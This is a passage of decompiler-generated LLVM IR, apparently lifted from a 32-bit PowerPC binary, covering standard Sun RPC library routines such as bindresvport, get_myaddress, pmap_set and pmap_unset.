  %v3_10013a00 = inttoptr i32 %v2_10013a00 to i32*
  store i32 %v2_100139f0, i32* %v3_10013a00, align 4
  %v0_10013a04.pre = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013a04

dec_label_pc_10013a04:                            ; preds = %entry, %dec_label_pc_10013a00
  %v1_10013a38 = phi i32 [ %v3_100139d8, %entry ], [ %v0_10013a04.pre, %dec_label_pc_10013a00 ]
  %v1_10013a04 = add i32 %v1_10013a38, 60
  %v2_10013a04 = inttoptr i32 %v1_10013a04 to i32*
  %v3_10013a04 = load i32, i32* %v2_10013a04, align 4
  %v2_10013a08 = ptrtoint i32* %stack_var_-56 to i32
  %v1_10013a0c = add i32 %v1_10013a38, 12
  store i32 %v1_10013a0c, i32* @r30, align 4
  %v3_10013a14 = icmp eq i32 %v3_10013a04, 0
  br i1 %v3_10013a14, label %dec_label_pc_10013a20, label %dec_label_pc_10013a9c

dec_label_pc_10013a20:                            ; preds = %dec_label_pc_10013a04
  %v1_10013a18 = add i32 %v1_10013a38, 40
  %v2_10013a38 = add i32 %v1_10013a38, 32
  %v3_10013a38 = inttoptr i32 %v2_10013a38 to i32*
  store i32 ptrtoint (i32* @global_var_10017464.475 to i32), i32* %v3_10013a38, align 4
  %v5_10013a4c = call i32 @__GI_xdrmem_create(i32* nonnull %stack_var_-56, i32 %v1_10013a18, i32 20, i32 0)
  %v0_10013a50 = load i32, i32* @r31, align 4
  store i32 %v0_10013a50, i32* @r4, align 4
  store i32 %v2_10013a08, i32* @r3, align 4
  store i32 268515932, i32* @lr, align 4
  %v0_10013a58 = call i32 @xdr_opaque_auth()
  %v0_10013a5c = load i32, i32* @r30, align 4
  store i32 %v0_10013a5c, i32* @r4, align 4
  store i32 %v2_10013a08, i32* @r3, align 4
  store i32 268515944, i32* @lr, align 4
  %v0_10013a64 = call i32 @xdr_opaque_auth()
  %v1_10013a70 = add i32 %tmp, 16
  %v2_10013a70 = inttoptr i32 %v1_10013a70 to i32*
  %v3_10013a70 = load i32, i32* %v2_10013a70, align 4
  call void @__pseudo_call(i32 %v3_10013a70)
  %v1_10013a7c = load i32, i32* @r31, align 4
  %v2_10013a7c = add i32 %v1_10013a7c, 60
  %v3_10013a7c = inttoptr i32 %v2_10013a7c to i32*
  store i32 %v2_10013a08, i32* %v3_10013a7c, align 4
  %v1_10013a88 = add i32 %tmp, 28
  %v2_10013a88 = inttoptr i32 %v1_10013a88 to i32*
  %v3_10013a88 = load i32, i32* %v2_10013a88, align 4
  %v3_10013a8c = icmp eq i32 %v3_10013a88, 0
  br i1 %v3_10013a8c, label %dec_label_pc_10013a9c, label %dec_label_pc_10013a94

dec_label_pc_10013a94:                            ; preds = %dec_label_pc_10013a20
  call void @__pseudo_call(i32 %v3_10013a88)
  br label %dec_label_pc_10013a9c

dec_label_pc_10013a9c:                            ; preds = %dec_label_pc_10013a04, %dec_label_pc_10013a20, %dec_label_pc_10013a94
  %v0_10013a9c = load i32, i32* @r31, align 4
  br label %dec_label_pc_10013aa0

dec_label_pc_10013aa0:                            ; preds = %dec_label_pc_100139f0, %dec_label_pc_10013a9c
  %v0_10013ab0 = phi i32 [ 0, %dec_label_pc_100139f0 ], [ %v0_10013a9c, %dec_label_pc_10013a9c ]
  ret i32 %v0_10013ab0

; uselistorder directives
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 ()* @xdr_opaque_auth, { 1, 0, 2, 3 }
  uselistorder i32 (i32*, i32, i32, i32)* @__GI_xdrmem_create, { 2, 1, 0, 3 }
  uselistorder i32 (i32, i32)* @calloc, { 1, 3, 0, 2 }
  uselistorder i32 64, { 12, 0, 1, 2, 3, 4, 5, 6, 7, 33, 37, 38, 8, 39, 9, 10, 11, 35, 36, 44, 34, 16, 51, 32, 17, 40, 18, 19, 20, 21, 22, 23, 24, 14, 46, 47, 49, 48, 41, 42, 25, 26, 43, 27, 50, 28, 29, 30, 31, 45, 15, 13 }
  uselistorder i32 152, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_10013aa0, { 1, 0 }
  uselistorder label %dec_label_pc_10013a9c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10013a04, { 1, 0 }
}

define i32 @__GI_xdr_authunix_parms(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r3, align 4
  store i32 %arg2, i32* @r31, align 4
  store i32 %tmp, i32* @r30, align 4
  store i32 268516048, i32* @lr, align 4
  %v0_10013acc = call i32 @xdr_u_long()
  store i32 255, i32* @r5, align 4
  %v3_10013ad4 = icmp eq i32 %v0_10013acc, 0
  %v0_10013ad8 = load i32, i32* @r31, align 4
  %v1_10013ad8 = add i32 %v0_10013ad8, 4
  store i32 %v1_10013ad8, i32* @r4, align 4
  br i1 %v3_10013ad4, label %dec_label_pc_10013b4c, label %dec_label_pc_10013ae4

dec_label_pc_10013ae4:                            ; preds = %entry
  %v0_10013adc = load i32, i32* @r30, align 4
  store i32 268516072, i32* @lr, align 4
  %v3_10013ae4 = inttoptr i32 %v0_10013adc to i32*
  %v4_10013ae4 = call i32 @__GI_xdr_string(i32* %v3_10013ae4)
  %v0_10013ae8 = load i32, i32* @r31, align 4
  %v1_10013ae8 = add i32 %v0_10013ae8, 8
  store i32 %v1_10013ae8, i32* @r4, align 4
  %v3_10013aec = icmp eq i32 %v4_10013ae4, 0
  %v0_10013af0 = load i32, i32* @r30, align 4
  store i32 %v0_10013af0, i32* @r3, align 4
  br i1 %v3_10013aec, label %dec_label_pc_10013b4c, label %dec_label_pc_10013af8

dec_label_pc_10013af8:                            ; preds = %dec_label_pc_10013ae4
  store i32 268516092, i32* @lr, align 4
  %v2_10013af8 = inttoptr i32 %v0_10013af0 to i32*
  %v3_10013af8 = inttoptr i32 %v1_10013ae8 to i32*
  %v4_10013af8 = call i32 @xdr_u_int(i32* %v2_10013af8, i32* %v3_10013af8)
  %v0_10013afc = load i32, i32* @r31, align 4
  %v1_10013afc = add i32 %v0_10013afc, 12
  store i32 %v1_10013afc, i32* @r4, align 4
  %v3_10013b00 = icmp eq i32 %v4_10013af8, 0
  %v0_10013b04 = load i32, i32* @r30, align 4
  store i32 %v0_10013b04, i32* @r3, align 4
  br i1 %v3_10013b00, label %dec_label_pc_10013b4c, label %dec_label_pc_10013b0c

dec_label_pc_10013b0c:                            ; preds = %dec_label_pc_10013af8
  store i32 ptrtoint (i32* @global_var_10013b10.476 to i32), i32* @lr, align 4
  %v2_10013b0c = inttoptr i32 %v0_10013b04 to i32*
  %v3_10013b0c = inttoptr i32 %v1_10013afc to i32*
  %v4_10013b0c = call i32 @xdr_u_int(i32* %v2_10013b0c, i32* %v3_10013b0c)
  %v3_10013b14 = icmp eq i32 %v4_10013b0c, 0
  %v0_10013b18 = load i32, i32* @r31, align 4
  %v0_10013b1c = load i32, i32* @r30, align 4
  store i32 268506280, i32* @r8, align 4
  br i1 %v3_10013b14, label %dec_label_pc_10013b4c, label %dec_label_pc_10013b34

dec_label_pc_10013b34:                            ; preds = %dec_label_pc_10013b0c
  %v1_10013b24 = add i32 %v0_10013b18, 20
  %v1_10013b18 = add i32 %v0_10013b18, 16
  store i32 268516152, i32* @lr, align 4
  %v6_10013b34 = inttoptr i32 %v0_10013b1c to i32*
  %v7_10013b34 = call i32 @__GI_xdr_array(i32* %v6_10013b34, i32 %v1_10013b24, i32 %v1_10013b18, i32 16, i32 4, i32 268506280)
  %v2_10013b38 = icmp ne i32 %v7_10013b34, 0
  %v5_10013b3c = zext i1 %v2_10013b38 to i32
  br label %dec_label_pc_10013b4c

dec_label_pc_10013b4c:                            ; preds = %entry, %dec_label_pc_10013ae4, %dec_label_pc_10013af8, %dec_label_pc_10013b0c, %dec_label_pc_10013b34
  %storemerge = phi i32 [ %v5_10013b3c, %dec_label_pc_10013b34 ], [ 0, %dec_label_pc_10013b0c ], [ 0, %dec_label_pc_10013af8 ], [ 0, %dec_label_pc_10013ae4 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v0_10013b18, { 1, 0 }
  uselistorder i32 268506280, { 1, 0 }
  uselistorder i32 (i32*)* @__GI_xdr_string, { 1, 0 }
  uselistorder i32 ()* @xdr_u_long, { 9, 11, 14, 8, 7, 13, 6, 10, 2, 1, 0, 12, 5, 4, 3 }
  uselistorder label %dec_label_pc_10013b4c, { 4, 3, 2, 1, 0 }
}

define i32 @__GI_bindresvport(i32 %arg1, i16* %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %v0_10013b64 = load i32, i32* @lr, align 4
  store i32 %v0_10013b64, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r29.global-to-local, align 4
  %v4_10013b6c = icmp eq i16* %arg2, null
  store i32 %arg1, i32* %r28.global-to-local, align 4
  br i1 %v4_10013b6c, label %dec_label_pc_10013b7c, label %dec_label_pc_10013b98

dec_label_pc_10013b7c:                            ; preds = %entry
  %v2_10013b7c = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10013b7c, i32* %r29.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_10013b8c.477 to i32), i32* @lr, align 4
  %v3_10013b88 = call i32 @__GI_memset(i32 %v2_10013b7c, i32 16, i32 16)
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-40, align 4
  br label %dec_label_pc_10013bb8

dec_label_pc_10013b98:                            ; preds = %entry
  %v2_10013b98 = load i16, i16* %arg2, align 2
  %v3_10013b98 = zext i16 %v2_10013b98 to i32
  store i32 %v3_10013b98, i32* %r0.global-to-local, align 4
  %v3_10013b9c = icmp eq i16 %v2_10013b98, 2
  br i1 %v3_10013b9c, label %dec_label_pc_10013bb8, label %dec_label_pc_10013ba4

dec_label_pc_10013ba4:                            ; preds = %dec_label_pc_10013b98
  %v0_10013ba4 = call i32 @__errno_location()
  store i32 96, i32* %r0.global-to-local, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10013bb0 = inttoptr i32 %v0_10013ba4 to i32*
  store i32 96, i32* %v2_10013bb0, align 4
  %v0_10013c60.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013c5c

dec_label_pc_10013bb8:                            ; preds = %dec_label_pc_10013b98, %dec_label_pc_10013b7c
  %v3_10013bbc = load i16, i16* @global_var_1002c3ec.479, align 2
  %v4_10013bbc = sext i16 %v3_10013bbc to i32
  store i32 %v4_10013bbc, i32* %r0.global-to-local, align 4
  %v3_10013bc0 = icmp eq i16 %v3_10013bbc, 0
  br i1 %v3_10013bc0, label %dec_label_pc_10013bc8, label %dec_label_pc_10013be4

dec_label_pc_10013bc8:                            ; preds = %dec_label_pc_10013bb8
  store i32 ptrtoint (i32* @global_var_10013bcc.480 to i32), i32* @lr, align 4
  %v0_10013bc8 = call i32 @__libc_getpid()
  %v2_10013bd0 = srem i32 %v0_10013bc8, 424
  %v1_10013bd4 = sub i32 %v0_10013bc8, %v2_10013bd0
  store i32 %v1_10013bd4, i32* %r0.global-to-local, align 4
  %v1_10013bdc = add nsw i32 %v2_10013bd0, 600
  %v1_10013be0 = trunc i32 %v1_10013bdc to i16
  store i16 %v1_10013be0, i16* @global_var_1002c3ec.479, align 2
  br label %dec_label_pc_10013be4

dec_label_pc_10013be4:                            ; preds = %dec_label_pc_10013bb8, %dec_label_pc_10013bc8
  %v0_10013be4 = call i32 @__errno_location()
  store i32 0, i32* @r31, align 4
  store i32 98, i32* %r0.global-to-local, align 4
  store i32 %v0_10013be4, i32* @r30, align 4
  store i32 -1, i32* %r9.global-to-local, align 4
  %v2_10013bf8 = inttoptr i32 %v0_10013be4 to i32*
  store i32 98, i32* %v2_10013bf8, align 4
  %v0_10013c34.pre = load i32, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013c2c

dec_label_pc_10013c00:                            ; preds = %dec_label_pc_10013c50
  %v3_10013c00 = load i16, i16* @global_var_1002c3ec.479, align 2
  %v4_10013c00 = sext i16 %v3_10013c00 to i32
  store i32 %v4_10013c00, i32* %r9.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1002c3ed.481 to i32), i32* %r0.global-to-local, align 4
  %v3_10013c08 = add i32 %v0_10013c3c, 2
  %v4_10013c08 = inttoptr i32 %v3_10013c08 to i16*
  store i16 %v3_10013c00, i16* %v4_10013c08, align 2
  %v0_10013c0c = load i32, i32* %r0.global-to-local, align 4
  %v1_10013c0c = mul i32 %v0_10013c0c, 65536
  %v2_10013c0c = sdiv i32 %v1_10013c0c, 65536
  store i32 %v2_10013c0c, i32* %r0.global-to-local, align 4
  %v1_10013c14 = trunc i32 %v2_10013c0c to i16
  store i16 %v1_10013c14, i16* @global_var_1002c3ec.479, align 2
  %tmp8 = icmp slt i32 %v1_10013c0c, 67043329
  br i1 %tmp8, label %dec_label_pc_10013c24, label %dec_label_pc_10013c1c

dec_label_pc_10013c1c:                            ; preds = %dec_label_pc_10013c00
  store i32 600, i32* %r0.global-to-local, align 4
  store i16 600, i16* @global_var_1002c3ec.479, align 2
  br label %dec_label_pc_10013c24

dec_label_pc_10013c24:                            ; preds = %dec_label_pc_10013c00, %dec_label_pc_10013c1c
  store i32 268516392, i32* @lr, align 4
  %v0_10013c24 = call i32 @bind()
  store i32 %v0_10013c24, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_10013c2c

dec_label_pc_10013c2c:                            ; preds = %dec_label_pc_10013be4, %dec_label_pc_10013c24
  %v0_10013c34 = phi i32 [ %v0_10013c34.pre, %dec_label_pc_10013be4 ], [ %v0_10013c24, %dec_label_pc_10013c24 ]
  %v0_10013c2c = load i32, i32* @r31, align 4
  %v2_10013c2c = icmp sgt i32 %v0_10013c2c, 423
  %v0_10013c38 = load i32, i32* %r28.global-to-local, align 4
  store i32 %v0_10013c38, i32* @r3, align 4
  %v0_10013c3c = load i32, i32* %r29.global-to-local, align 4
  %v1_10013c44 = add i32 %v0_10013c2c, 1
  store i32 %v1_10013c44, i32* @r31, align 4
  %tmp7 = icmp sgt i32 %v0_10013c34, -1
  %or.cond = or i1 %tmp7, %v2_10013c2c
  br i1 %or.cond, label %dec_label_pc_10013c5c, label %dec_label_pc_10013c50

dec_label_pc_10013c50:                            ; preds = %dec_label_pc_10013c2c
  %v0_10013c50 = load i32, i32* @r30, align 4
  %v1_10013c50 = inttoptr i32 %v0_10013c50 to i32*
  %v2_10013c50 = load i32, i32* %v1_10013c50, align 4
  store i32 %v2_10013c50, i32* %r0.global-to-local, align 4
  %v3_10013c54 = icmp eq i32 %v2_10013c50, 98
  br i1 %v3_10013c54, label %dec_label_pc_10013c00, label %dec_label_pc_10013c5c

dec_label_pc_10013c5c:                            ; preds = %dec_label_pc_10013c50, %dec_label_pc_10013c2c, %dec_label_pc_10013ba4
  %v0_10013c60 = phi i32 [ %v0_10013c60.pre, %dec_label_pc_10013ba4 ], [ %v0_10013c34, %dec_label_pc_10013c2c ], [ %v0_10013c34, %dec_label_pc_10013c50 ]
  store i32 %v0_10013b64, i32* %r0.global-to-local, align 4
  ret i32 %v0_10013c60

; uselistorder directives
  uselistorder i32 %v2_10013c0c, { 1, 0 }
  uselistorder i32* %r29.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 5, 1, 2, 3, 4, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 98, { 1, 0, 2 }
  uselistorder i32 ()* @__libc_getpid, { 0, 6, 5, 4, 1, 3, 2 }
  uselistorder i16* @global_var_1002c3ec.479, { 4, 3, 2, 1, 0 }
  uselistorder i32 96, { 0, 10, 2, 3, 11, 4, 5, 6, 7, 8, 9, 1 }
  uselistorder label %dec_label_pc_10013c2c, { 1, 0 }
  uselistorder label %dec_label_pc_10013c24, { 1, 0 }
  uselistorder label %dec_label_pc_10013be4, { 1, 0 }
}

define i32 @__get_myaddress(i32 %arg1) local_unnamed_addr {
entry:
  %tmp = call i16 @__decompiler_undefined_function_3()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4160 = alloca i32, align 4
  %stack_var_-4168 = alloca i32, align 4
  %stack_var_-4128 = alloca i32, align 4
  store i32 %arg1, i32* @r27, align 4
  store i32 268516504, i32* @lr, align 4
  %v3_10013c94 = call i32 @socket(i32 2, i32 2, i32 0)
  store i32 %v3_10013c94, i32* @r29, align 4
  %tmp13 = icmp sgt i32 %v3_10013c94, -1
  br i1 %tmp13, label %dec_label_pc_10013cac, label %dec_label_pc_10013ca0

dec_label_pc_10013ca0:                            ; preds = %entry
  store i32 ptrtoint ([24 x i8]* @global_var_10017478.482 to i32), i32* @r3, align 4
  br label %dec_label_pc_10013ce4

dec_label_pc_10013cac:                            ; preds = %entry
  store i32 4096, i32* %stack_var_-4168, align 4
  %v2_10013cbc = ptrtoint i32* %stack_var_-4128 to i32
  %v2_10013cc0 = ptrtoint i32* %stack_var_-4168 to i32
  store i32 268516560, i32* @lr, align 4
  %v3_10013ccc = call i32 @ioctl(i32 35090, i32 %v2_10013cc0, i32 %v2_10013cc0)
  store i32 1, i32* @r28, align 4
  %tmp14 = icmp sgt i32 %v3_10013ccc, -1
  br i1 %tmp14, label %dec_label_pc_10013cf0.preheader, label %dec_label_pc_10013cdc

dec_label_pc_10013cdc:                            ; preds = %dec_label_pc_10013cac
  store i32 ptrtoint ([53 x i8]* @global_var_10017490.483 to i32), i32* @r3, align 4
  br label %dec_label_pc_10013ce4

dec_label_pc_10013ce4:                            ; preds = %dec_label_pc_10013d28, %dec_label_pc_10013ca0, %dec_label_pc_10013cdc
  %stack_var_-4164.0 = phi i32 [ %stack_var_-4164.1.ph, %dec_label_pc_10013d28 ], [ %v2_10013cbc, %dec_label_pc_10013cdc ], [ %tmp6, %dec_label_pc_10013ca0 ]
  store i32 ptrtoint ([3 x i8]* @global_var_10013ce8.484 to i32), i32* @lr, align 4
  %v0_10013ce4 = call i32 @perror()
  %v0_10013cec = call i32 @__GI_exit()
  br label %dec_label_pc_10013cf0.preheader

dec_label_pc_10013cf0.preheader:                  ; preds = %dec_label_pc_10013ce4, %dec_label_pc_10013cac
  %stack_var_-4164.1.ph = phi i32 [ %stack_var_-4164.0, %dec_label_pc_10013ce4 ], [ %v2_10013cbc, %dec_label_pc_10013cac ]
  %v2_10013cfc = ptrtoint i32* %stack_var_-4160 to i32
  %tmp16 = urem i16 %tmp, 2
  %v3_10013d38 = icmp eq i16 %tmp16, 0
  %v1_10013d4c = and i16 %tmp, 8
  %v3_10013d4c = icmp eq i16 %v1_10013d4c, 0
  br label %dec_label_pc_10013cf0

dec_label_pc_10013cf0:                            ; preds = %dec_label_pc_10013cf0.preheader, %dec_label_pc_10013d98
  store i32 %stack_var_-4164.1.ph, i32* @r31, align 4
  %v3_10013cf4 = load i32, i32* %stack_var_-4168, align 4
  store i32 %v3_10013cf4, i32* @r30, align 4
  %v3_10013d884 = icmp eq i32 %v3_10013cf4, 0
  br i1 %v3_10013d884, label %dec_label_pc_10013d90, label %dec_label_pc_10013cfc

dec_label_pc_10013cfc:                            ; preds = %dec_label_pc_10013cf0, %dec_label_pc_10013d80
  %v0_10013d14 = load i32, i32* @r29, align 4
  store i32 268516640, i32* @lr, align 4
  %v3_10013d1c = call i32 @ioctl(i32 %v0_10013d14, i32 35091, i32 %v2_10013cfc)
  %tmp15 = icmp sgt i32 %v3_10013d1c, -1
  br i1 %tmp15, label %dec_label_pc_10013d34, label %dec_label_pc_10013d28

dec_label_pc_10013d28:                            ; preds = %dec_label_pc_10013cfc
  store i32 ptrtoint ([23 x i8]* @global_var_100174c8.485 to i32), i32* @r3, align 4
  br label %dec_label_pc_10013ce4

dec_label_pc_10013d34:                            ; preds = %dec_label_pc_10013cfc
  %v0_10013d80.pre = load i32, i32* @r31, align 4
  br i1 %v3_10013d38, label %dec_label_pc_10013d80, label %dec_label_pc_10013d40

dec_label_pc_10013d40:                            ; preds = %dec_label_pc_10013d34
  %v1_10013d40 = add i32 %v0_10013d80.pre, 16
  %v2_10013d40 = inttoptr i32 %v1_10013d40 to i16*
  %v3_10013d40 = load i16, i16* %v2_10013d40, align 2
  %v3_10013d44 = icmp eq i16 %v3_10013d40, 2
  br i1 %v3_10013d44, label %dec_label_pc_10013d4c, label %dec_label_pc_10013d80

dec_label_pc_10013d4c:                            ; preds = %dec_label_pc_10013d40
  br i1 %v3_10013d4c, label %dec_label_pc_10013d54, label %dec_label_pc_10013d5c

dec_label_pc_10013d54:                            ; preds = %dec_label_pc_10013d4c
  %v0_10013d54 = load i32, i32* @r28, align 4
  %v3_10013d54 = icmp eq i32 %v0_10013d54, 0
  br i1 %v3_10013d54, label %dec_label_pc_10013d5c, label %dec_label_pc_10013d80

dec_label_pc_10013d5c:                            ; preds = %dec_label_pc_10013d54, %dec_label_pc_10013d4c
  %v0_10013d6c = load i32, i32* @r29, align 4
  %v2_10013d70 = load i32, i32* @r27, align 4
  %v3_10013d70 = add i32 %v2_10013d70, 2
  %v4_10013d70 = inttoptr i32 %v3_10013d70 to i16*
  store i16 111, i16* %v4_10013d70, align 2
  store i32 ptrtoint ([3 x i8]* @global_var_10013d78.486 to i32), i32* @lr, align 4
  %v1_10013d74 = call i32 @__libc_close(i32 %v0_10013d6c)
  br label %dec_label_pc_10013dac

dec_label_pc_10013d80:                            ; preds = %dec_label_pc_10013d34, %dec_label_pc_10013d54, %dec_label_pc_10013d40
  %v1_10013d80 = add i32 %v0_10013d80.pre, 32
  store i32 %v1_10013d80, i32* @r31, align 4
  %v0_10013d84 = load i32, i32* @r30, align 4
  %v1_10013d84 = add i32 %v0_10013d84, -32
  store i32 %v1_10013d84, i32* @r30, align 4
  %v3_10013d88 = icmp eq i32 %v1_10013d84, 0
  br i1 %v3_10013d88, label %dec_label_pc_10013d90, label %dec_label_pc_10013cfc

dec_label_pc_10013d90:                            ; preds = %dec_label_pc_10013d80, %dec_label_pc_10013cf0
  %v0_10013d90 = load i32, i32* @r28, align 4
  %v3_10013d90 = icmp eq i32 %v0_10013d90, 1
  br i1 %v3_10013d90, label %dec_label_pc_10013d98, label %dec_label_pc_10013da0

dec_label_pc_10013d98:                            ; preds = %dec_label_pc_10013d90
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_10013cf0

dec_label_pc_10013da0:                            ; preds = %dec_label_pc_10013d90
  %v0_10013da0 = load i32, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10013da8.487 to i32), i32* @lr, align 4
  %v1_10013da4 = call i32 @__libc_close(i32 %v0_10013da0)
  br label %dec_label_pc_10013dac

dec_label_pc_10013dac:                            ; preds = %dec_label_pc_10013d5c, %dec_label_pc_10013da0
  %storemerge1 = phi i32 [ 0, %dec_label_pc_10013da0 ], [ 1, %dec_label_pc_10013d5c ]
  ret i32 %storemerge1

; uselistorder directives
  uselistorder i32 %v1_10013d84, { 1, 0 }
  uselistorder i32 %v2_10013cc0, { 1, 0 }
  uselistorder i32* %stack_var_-4168, { 0, 2, 1 }
  uselistorder i32 (i32)* @__libc_close, { 1, 0, 4, 3, 2, 12, 11, 5, 10, 9, 7, 6, 8 }
  uselistorder i16 8, { 0, 6, 1, 2, 3, 4, 5 }
  uselistorder i16 2, { 5, 0, 6, 1, 4, 7, 2, 3 }
  uselistorder i32 ()* @__GI_exit, { 2, 0, 1, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3 }
  uselistorder i32 (i32, i32, i32)* @ioctl, { 4, 3, 9, 8, 5, 0, 2, 1, 10, 6, 7 }
  uselistorder i32 4096, { 2, 0, 3, 6, 7, 1, 5, 4 }
  uselistorder i32 (i32, i32, i32)* @socket, { 0, 3, 1, 2, 6, 5, 4 }
  uselistorder label %dec_label_pc_10013dac, { 1, 0 }
  uselistorder label %dec_label_pc_10013d80, { 1, 2, 0 }
  uselistorder label %dec_label_pc_10013cfc, { 1, 0 }
  uselistorder label %dec_label_pc_10013cf0, { 1, 0 }
  uselistorder label %dec_label_pc_10013ce4, { 0, 2, 1 }
}

define i32 @__GI_pmap_unset(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %v2_10013dcc = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10013dcc, i32* %r29.global-to-local, align 4
  store i32 -1, i32* %stack_var_-72, align 4
  store i32 268516844, i32* @lr, align 4
  %v1_10013de8 = call i32 @__get_myaddress(i32 %v2_10013dcc)
  %v2_10013dec = ptrtoint i32* %stack_var_-24 to i32
  %v3_10013df0 = icmp eq i32 %v1_10013de8, 0
  store i32 %v2_10013dec, i32* @r6, align 4
  %v2_10013e00 = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_10013e00, i32* @r7, align 4
  store i32 400, i32* @r8, align 4
  store i32 400, i32* @r9, align 4
  br i1 %v3_10013df0, label %dec_label_pc_10013eb8, label %dec_label_pc_10013e18

dec_label_pc_10013e18:                            ; preds = %entry
  store i32 5, i32* %stack_var_-24, align 4
  store i32 268516916, i32* @lr, align 4
  %v9_10013e30 = call i32 @__GI_clntudp_bufcreate(i32 %v2_10013dcc, i32 100000, i32 2)
  store i32 %v9_10013e30, i32* %r29.global-to-local, align 4
  %v3_10013e34 = icmp eq i32 %v9_10013e30, 0
  %v2_10013e58 = ptrtoint i32* %stack_var_-68 to i32
  store i32 %v2_10013e58, i32* @r8, align 4
  br i1 %v3_10013e34, label %dec_label_pc_10013eb8, label %dec_label_pc_10013e60

dec_label_pc_10013e60:                            ; preds = %dec_label_pc_10013e18
  store i32 60, i32* %stack_var_-24, align 4
  %v1_10013e88 = add i32 %v9_10013e30, 4
  %v2_10013e88 = inttoptr i32 %v1_10013e88 to i32*
  %v3_10013e88 = load i32, i32* %v2_10013e88, align 4
  %v1_10013e8c = inttoptr i32 %v3_10013e88 to i32*
  %v2_10013e8c = load i32, i32* %v1_10013e8c, align 4
  call void @__pseudo_call(i32 %v2_10013e8c)
  %v0_10013e98 = load i32, i32* %r29.global-to-local, align 4
  %v1_10013e98 = add i32 %v0_10013e98, 4
  %v2_10013e98 = inttoptr i32 %v1_10013e98 to i32*
  %v3_10013e98 = load i32, i32* %v2_10013e98, align 4
  %v1_10013ea0 = add i32 %v3_10013e98, 16
  %v2_10013ea0 = inttoptr i32 %v1_10013ea0 to i32*
  %v3_10013ea0 = load i32, i32* %v2_10013ea0, align 4
  call void @__pseudo_call(i32 %v3_10013ea0)
  %v3_10013eac = load i32, i32* %stack_var_-68, align 4
  br label %dec_label_pc_10013eb8

dec_label_pc_10013eb8:                            ; preds = %entry, %dec_label_pc_10013e18, %dec_label_pc_10013e60
  %storemerge = phi i32 [ %v3_10013eac, %dec_label_pc_10013e60 ], [ 0, %dec_label_pc_10013e18 ], [ 0, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder label %dec_label_pc_10013eb8, { 2, 1, 0 }
}

define i32 @pmap_set(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %stack_var_-84 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-80 = alloca i32, align 4
  %v2_10013ed8 = ptrtoint i32* %stack_var_-80 to i32
  store i32 %v2_10013ed8, i32* %r29.global-to-local, align 4
  store i32 -1, i32* %stack_var_-88, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10013f00.492 to i32), i32* @lr, align 4
  %v1_10013efc = call i32 @__get_myaddress(i32 %v2_10013ed8)
  %v2_10013f00 = ptrtoint i32* %stack_var_-40 to i32
  %v3_10013f04 = icmp eq i32 %v1_10013efc, 0
  store i32 %v2_10013f00, i32* @r6, align 4
  %v2_10013f14 = ptrtoint i32* %stack_var_-88 to i32
  store i32 %v2_10013f14, i32* @r7, align 4
  store i32 400, i32* @r8, align 4
  store i32 400, i32* @r9, align 4
  br i1 %v3_10013f04, label %dec_label_pc_10013fe8, label %dec_label_pc_10013f2c

dec_label_pc_10013f2c:                            ; preds = %entry
  store i32 5, i32* %stack_var_-40, align 4
  store i32 268517192, i32* @lr, align 4
  %v9_10013f44 = call i32 @__GI_clntudp_bufcreate(i32 %v2_10013ed8, i32 100000, i32 2)
  store i32 %v9_10013f44, i32* %r29.global-to-local, align 4
  %v3_10013f48 = icmp eq i32 %v9_10013f44, 0
  %v2_10013f68 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_10013f68, i32* @r8, align 4
  br i1 %v3_10013f48, label %dec_label_pc_10013fe8, label %dec_label_pc_10013fc8

dec_label_pc_10013fc8:                            ; preds = %dec_label_pc_10013f2c
  store i32 60, i32* %stack_var_-40, align 4
  %v1_10013f98 = add i32 %v9_10013f44, 4
  %v2_10013f98 = inttoptr i32 %v1_10013f98 to i32*
  %v3_10013f98 = load i32, i32* %v2_10013f98, align 4
  %v1_10013f9c = inttoptr i32 %v3_10013f98 to i32*
  %v2_10013f9c = load i32, i32* %v1_10013f9c, align 4
  call void @__pseudo_call(i32 %v2_10013f9c)
  store i32 ptrtoint ([24 x i8]* @global_var_100174e0.493 to i32), i32* @r4, align 4
  %v0_10013fb4 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10013fb4, i32* @r3, align 4
